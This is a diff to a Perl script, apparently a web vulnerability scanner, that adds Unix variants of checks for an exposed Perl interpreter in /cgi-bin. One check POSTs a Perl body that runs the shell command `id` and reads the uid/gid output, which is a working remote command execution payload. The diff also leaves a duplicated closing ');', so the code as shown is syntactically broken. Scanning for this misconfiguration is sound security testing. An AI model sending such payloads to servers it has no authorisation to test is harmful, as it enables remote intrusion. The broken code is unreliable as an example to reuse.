@@ -30,20 +30,35 @@ my $fragment = $uri_obj->fragment;
 my $url = "$scheme://$ip:$port$path_query"; # including port makes parsing easier
 my $req;
 my $res;
+# TODO consider adding php && shellshock?
 my @checks = (
 	{
-		name => "perl_minus_v",
+		name => "windows_perl_minus_v",
 		url => '/cgi-bin/perl.exe?-v',
 		re  => 'Larry Wall',
 		method => 'GET'
 	},
 	{
-		name => "perl_cmd_exec",
+		name => "windows_perl_cmd_exec",
 		url => '/cgi-bin/perl.exe',
 		re  => 'uid=.*gid=',
 		method => 'POST',
 		body => "print \"Content-type: text/html\\n\\n\";\nprint \`id\`;"
 	},
+	{
+		name => "unix_perl_minus_v",
+		url => '/cgi-bin/perl?-v',
+		re  => 'Larry Wall',
+		method => 'GET'
+	},
+	{
+		name => "unix_perl_cmd_exec",
+		url => '/cgi-bin/perl',
+		re  => 'uid=.*gid=',
+		method => 'POST',
+		body => "print \"Content-type: text/html\\n\\n\";\nprint \`id\`;"
+	},
+);
 );
 
 print "[+] Canonicalised URL: $url_dirty -> $url\n";
